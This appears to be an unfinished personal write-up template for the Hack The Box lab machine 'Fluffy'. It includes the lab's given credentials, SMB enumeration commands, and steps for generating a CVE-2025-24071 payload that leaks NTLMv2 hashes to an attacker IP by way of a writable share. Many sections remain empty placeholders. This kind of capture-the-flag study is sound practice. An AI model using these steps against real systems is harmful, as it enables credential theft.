---
file_created: 12 Sep 2025 01:14
title: Fluffy
difficulty: Easy
difficult_sort: 1
points: 0
os: Windows
target_ip: 10.10.11.69
platform: Hack The Box
category: B2R
box_status: Retired
url: https://app.hackthebox.com/machines/Fluffy
user_flag:
root_flag:
completed:
date_finish:
tags:
  - htb/machines
---
# Resolution summary
![400x200](<./attachments/Fluffy.png>)

>[!summary]
>- Starting with credentials for the following account:
>j.fleischman : J0elTHEM4n1990!

## Tutorial
 - [HTB-Writeup-Fluffy](<./attachments/Fluffy.pdf>)
```cardlink
url: https://infosecwriteups.com/fluffy-hack-the-box-walkthrough-e0431cfa4ece
title: "Fluffy Hack The Box Walkthrough | Windows AD Exploitation & ESC16 Privilege Escalation"
description: "Step-by-step guide to exploiting Windows AD, capturing NTLM hashes, and escalating to administrator on Hack The Box Fluffy."
host: infosecwriteups.com
favicon: https://miro.medium.com/v2/resize:fill:256:256/1*A6LVtmXcJ3QJy_sdCyFx1Q.png
image: https://miro.medium.com/v2/resize:fit:691/1*PG0jfztbM9q6F3yBgTDQYg.png
```

## Improved skills
- Skill 1
- Skill 2

## Used tools
- nmap; gobuster
---
# Environment Setup
```bash
export HOST_IP=
export TARGET_
export DOMAIN=
{
  echo "HOST_IP=${HOST_IP:-}"
  echo "TARGET_IP=${TARGET_IP:-}"
  echo "DOMAIN=${DOMAIN:-}"
} > .env
source .env
```
---
# Information Gathering

Scanned all TCP ports:

```bash

```

Enumerated open TCP ports:

```bash

```

Enumerated top 200 UDP ports:

```bash

```

---

# Enumeration

## Port 80 - HTTP (Apache)

## Port 445 - smb
### SMB Access & File Discovery
With valid credentials in hand, the next step is to enumerate accessible SMB shares. Using **smbmap**, we authenticate as `j.fleischman` with the given password.

```bash
smbmap -H 10.10.11.69 -u 'j.fleischman' -p 'J0elTHEM4n1990!'
```
![](<./attachments/Fluffy-1.png>)
The **IT share** looks interesting since we have **both read and write permissions**, which is often a useful foothold in AD environments.
### Connecting to the IT Share

We connect to the share with **smbclient**:
```bash 
smbclient //10.10.11.69/IT -U j.fleischman
#  J0elTHEM4n1990!
```
Once inside, we list the available files:
![](<./attachments/Fluffy-2.png>)
Here, we notice two installer packages (`Everything` and `KeePass`) and a PDF document named **Upgrade_Notice.pdf**. PDFs in AD environments often contain upgrade guides, IT memos, or even sensitive operational details making it worth inspecting.

### Downloading the PDF
Grab the file locally:
```bash
get Upgrade_Notice.pdf
```

---
# Exploitation 
## CVE-2025–24071
After reviewing `Upgrade_Notice.pdf`, I noticed references to **recent CVEs affecting file handling in Windows**, particularly **CVE-2025-24071**, which allows **NTLMv2 hash leakage via RAR/ZIP extraction and** `**.library-ms**` **files**.

Since the IT share was **writable**, it became an ideal place to upload **malicious files** to exploit this vulnerability. I decided to use a public proof-of-concept by 0x6rss to generate the payload.

First, I cloned the repository and navigated to the PoC directory:
```bash
git clone https://github.com/0x6rss/CVE-2025-24071_PoC  
cd CVE-2025-24071_PoC/
```
The repository includes a Python script (`poc.py`) to generate a malicious `.zip` file:
```bash
python3 poc.py  
# Enter your file name: TESTER 
# Enter IP (EX: 192.168.1.162): 10.10.14.85
```
---
# Lateral Movement to xxx

## Local enumeration


## Lateral movement vector

---
# Privilege Escalation to xxx

## Local enumeration


## Privilege Escalation vector


---
# Trophies

## User Flag
```txt

```
## Root Flag
```txt
```
## **/etc/shadow**

```bash

```

---
# Proof